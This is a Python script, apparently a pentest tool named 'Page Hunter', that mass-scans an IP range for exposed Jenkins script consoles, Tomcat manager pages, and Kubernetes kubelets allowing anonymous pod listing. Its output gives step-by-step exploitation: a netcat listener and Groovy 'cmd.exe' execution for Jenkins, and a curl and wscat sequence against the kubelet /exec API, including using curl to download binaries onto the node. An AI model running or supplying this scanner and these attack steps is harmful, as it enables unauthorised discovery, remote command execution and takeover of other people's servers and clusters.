import socket
import ipaddress
from ipaddress import IPv4Address, IPv4Network
import threading
from queue import Queue
import requests

print("\n")
print("\033[33m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m")
print("*                                                                                               *")
print("*                                                                                               *")
print("*  _______  _______  _______  _______                      _       _________ _______  _______   *")
print("* (  ____ )(  ___  )(  ____ \(  ____ \  |\     /||\     /|( (    /|\__   __/(  ____ \(  ____ )  *")
print("* | (    )|| (   ) || (    \/| (    \/  | )   ( || )   ( ||  \  ( |   ) (   | (    \/| (    )|  *")
print("* | (____)|| (___) || |      | (__      | (___) || |   | ||   \ | |   | |   | (__    | (____)|  *")
print("* |  _____)|  ___  || | ____ |  __)     |  ___  || |   | || (\ \) |   | |   |  __)   |     __)  *")
print("* | (      | (   ) || | \_  )| (        | (   ) || |   | || | \   |   | |   | (      | (\ (     *")
print("* | )      | )   ( || (___) || (____/\  | )   ( || (___) || )  \  |   | |   | (____/\| ) \ \__  *")
print("* |/       |/     \|(_______)(_______/  |/     \|(_______)|/    )_)   )_(   (_______/|/   \__/  *")
print("*                                                                                               *")
print("*                                                                                               *")  
print("*Page Hunter v1.1                                                                               *")
print("*Author: @cedowens                                                                              *")
print("\033[33m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m")


count = 0
unauthjenkins = []
commandlist = []
authjenkins = []
tomcatlist = []
consolelist = []
iplist = []
iprange = input("Enter IP range to check: ").strip()
port2 = 8080
port3 = 10250
numthreads = input("Enter the number of threads (For Mac, use a max of 250 unless you up the ulimit...on kali and most linux distros use a max of 1000 unless you up the ulimit): ").strip()
outfile = open("outfile.txt","w")
portopenlist = []
portopenlist2 = []
unauthexeclist = []
nulllist = []
authexec = []
unsuccessful = []

def Connector(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        result = sock.connect_ex((str(ip),port2))
        sock.close()
        if result == 0:
            print("\033[92mPort " + str(port2) + " OPEN on %s\033[0m" % str(ip))
            outfile.write("Port " + str(port2) + " OPEN on %s\n" % str(ip))
            portopenlist.append(str(ip))
        else:
            pass
            
    except:
        pass

def Connector2(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        result = sock.connect_ex((str(ip),10250))
        sock.close()
        if result == 0:
            print("\033[92mPort 10250 OPEN on %s\033[0m" % str(ip))
            outfile.write("Porrt 10250 OPEN on %s\n" % str(ip))
            portopenlist2.append(str(ip))
        else:
            pass
    except:
        pass
        

def threader():
    while True:
        worker = q.get()
        worker4 = q4.get()
        Connector(worker)
        Connector2(worker4)
        q.task_done()
        q4.task_done()



def pagechecker(host):
    url = "http://" + host + ":8080/script"
    url2 = "http://" + host + ":8080/manager/html"
    url3 = "http://" + host + ":8080/manager/text"
    url4 = "http://" + host + ":8080/console"
    url5 = "http://" + host + ":8080/command"
 
    
    try:
        response = requests.get(url, timeout=1)
        response2 = requests.get(url2, timeout=1)
        response3 = requests.get(url3, timeout=1)
        response4 = requests.get(url4, timeout=1)
        response5 = requests.get(url5, timeout=1)
        
        if (response.status_code == 200 and 'Jenkins' in response.text and 'Console' in response.text):
            print("+"*40)
            print("\033[91mHost with unauthenticated Jenkins:\033[0m")
            outfile.write("Host with unauthenticated Jenkins:\n")
            outfile.write(url)
            outfile.write("\n")
            unauthjenkins.append(host)
            print(url)
        elif (response.status_code != 200 and 'from=%2Fscript' in response.text):
            print("+"*40)
            print("\033[33mHost with authenticated Jenkins:\033[0m")
            outfile.write("Host with authenticated Jenkins:\n")
            print("http://" + host + ":" + str(port2))
            outfile.write("http://" + host + ":" + str(port2))
            outfile.write("\n")
            authjenkins.append(host)
        elif (response2.status_code == 200 and 'Tomcat Manager Application' in response2.text):
            print("+"*40)
            print("\033[33mTomcat Manager HTML Page Found:\033[0m")
            outfile.write("Tomcat Manager HTML Page Found:\n")
            print("http://" + host + ":" + str(port2) + '/manager/html')
            outfile.write(url2)
            outfile.write("\n")
            tomcatlist.append(host)
            print(url2)
        elif (response3.status_code == 200 and 'Manager' in response3.text):
            print("+"*40)
            print("\033[33mTomcat manager/text Page Found:\033[0m")
            print("http://" + host + ":" + str(port2) + '/manager/text')
            outfile.write("Tomcat manager/text Page Found:\n")
            outfile.write(url3)
            outfile.write("\n")
            tomcatlist.append(host)
            print(url3)
        elif (response4.status_code == 200 and 'Console' in response4.text):
            print("+"*40)
            print("\033[33mPossibly open console page found:\033[0m")
            print("http://" + host + ":" + str(port2) + '/console')
            outfile.write("Possibly open console page found. Go check it out!:\n")
            outfile.write(url4)
            outfile.write("\n")
            consolelist.append(host)
        elif (response5.status_code == 200 and 'Command' in response5.text):
            print("+"*40)
            print("\033[33mPossibly open command page found:\033[0m")
            outfile.write("Possibly open command page found. Go check it out!:\n")
            outfile.write(url5)
            outfile.write("\n")
            commandlist.append(host)
        else:
            pass
    except requests.exceptions.RequestException:
        pass

def kubechecker(host):
    url6 = "https://" + host + ":" + str(port3) + "/pods"
    try:
        response6 = requests.get(url6, verify=False, timeout=1)

        if (response6.status_code == 200 and ('namespace' in response6.text or 'Namespace' in response6.text) and ('pod' in response6.text or 'Pod' in response6.text)):
            print("+"*40)
            print("\033[91mKubernetes node allowing system:anonymous viewing of pods found: %s\033[0m" % url6)
            outfile.write("Kubernetes node allowing system:anonymous viewing of pods found:\n")
            outfile.write(url6)
            outfile.write("\n")
            unauthexeclist.append(url6)
        elif (response6.status_code == 200 and '"items":null' in response6.text):
            print("+"*40)
            print("\033[33mKubernetes node with null PodList: %s\033[0m" % url6)
            outfile.write("Kubernetes node with null PodList:\n")
            outfile.write(url6)
            outfile.write("\n")
            nulllist.append(url6)
        elif response6.status_code == 401 or response6.status_code == 403:
            print("+"*40)
            print('\033[33mKubernetes node returned "unauthorized" response: %s\033[0m' % url6)
            outfile.write('Kubernetes node returned "unauthorized" response:\n')
            outfile.write(url6)
            outfile.write("\n")
            authexec.append(url6)
        else:
            pass
    except:
        pass


def threader2():
    while True:
        worker2 = q2.get()
        pagechecker(worker2)
        q2.task_done()

q = Queue()

q4 = Queue()

for ip in ipaddress.IPv4Network(iprange):
    count = count + 1
    iplist.append(str(ip))
    
for x in range(int(numthreads)):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()



for worker in iplist:
    q.put(worker)

for worker4 in iplist:
    q4.put(worker4)


q.join()
q4.join()

def threader3():
    while True:
        worker3 = q3.get()
        kubechecker(worker3)
        q3.task_done()

q2 = Queue()

for y in range(200):
    t2 = threading.Thread(target=threader2)
    t2.daemon = True
    t2.start()

for worker2 in portopenlist:
    item = str(ipaddress.IPv4Address(worker2))
    q2.put(item)

q2.join()

q3 = Queue()

for z in range(200):
    t3 = threading.Thread(target=threader3)
    t3.daemon = True
    t3.start()

for worker3 in portopenlist2:
    item = str(ipaddress.IPv4Address(worker3))
    q3.put(item)

q3.join()

if unauthjenkins != []:
    print("+"*40)
    print("If Jenkins is running on Linux, start a local netcat listener (ex: nc -nlvp <port>) and follow the steps here to get command shell access:")
    print("https://www.n00py.io/2017/01/compromising-jenkins-and-extracting-credentials/")
    print('')
    print("If Jenkins is running on Windows, run Windows commands by typing the following into the script console:")
    print("def sout = new StringBuffer(), serr = new StringBuffer()")
    print("def proc = 'cmd.exe /c <command>'.execute()")
    print("proc.waitForKill(1000)")
    print('println "out> $sout err> $serr"')

if unauthexeclist != []:
    print("+"*40)
    print("Since it appears you found at least 1 kubernetes node allowing unauthenticated exec API access, try the following steps to gain command execution:")
    print("1. Pick a namespace, pod, and container name from the /pods results on the kubernetes node.")
    print('2. Run the following curl command: curl -k -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://<kube-node>:10250/exec/<namespace>/<pod>/<container>?command=id&input=1&output=1&tty=1"')
    print('3. In the server response, look for the Location: <value>. You will next open a web socket to that location')
    print('4. Assuming use of wscat from your attack host, run: wscat -c "https://<kube-node>:10250/<location-path-value>" --no-check')
    print('5. Your wscat results from #4 above will show the results of the shell command executed. In this case the "id" command was run.')
    print('6. You can replace the "id" command with any other commands you want, such as curl to pull down binaries. If using curl, you will have one command value for each curl function (ex:command=curl&command="<url>"&command="-O" to download and write a file do disk)')
else:
    print("+"*40)
    print("No Kubernetes nodes with unauthenticated exec API access found.")

if unauthjenkins == []:
    print("+"*40)
    print("No instances of unauthenticated Jenkins found.")
    outfile.write("No instances of unauthenticated Jenkins found.\n")

if authjenkins == []:
    print("+"*40)
    print("No instances of authenticated Jenkins found.")
    outfile.write("No instances of authenticated Jenkins found.\n")

if tomcatlist == []:
    print("+"*40)
    print("No Apache Tomcat manager pages found.")
    outfile.write("No Apache Tomcat manager pages found.\n")

if consolelist == []:
    print("+"*40)
    print("No interesting sites with /console pages found.")
    outfile.write("No interesting sites with /console pages found.\n")

if commandlist == []:
    print("+"*40)
    print("No interesting sites with /command pages found.")
    outfile.write("No interesting sites with /command pages found.\n")

outfile.close()        
print("+"*40)
print("DONE!")
print("Data written to outfile.txt in the current directory.")
print("+"*40)
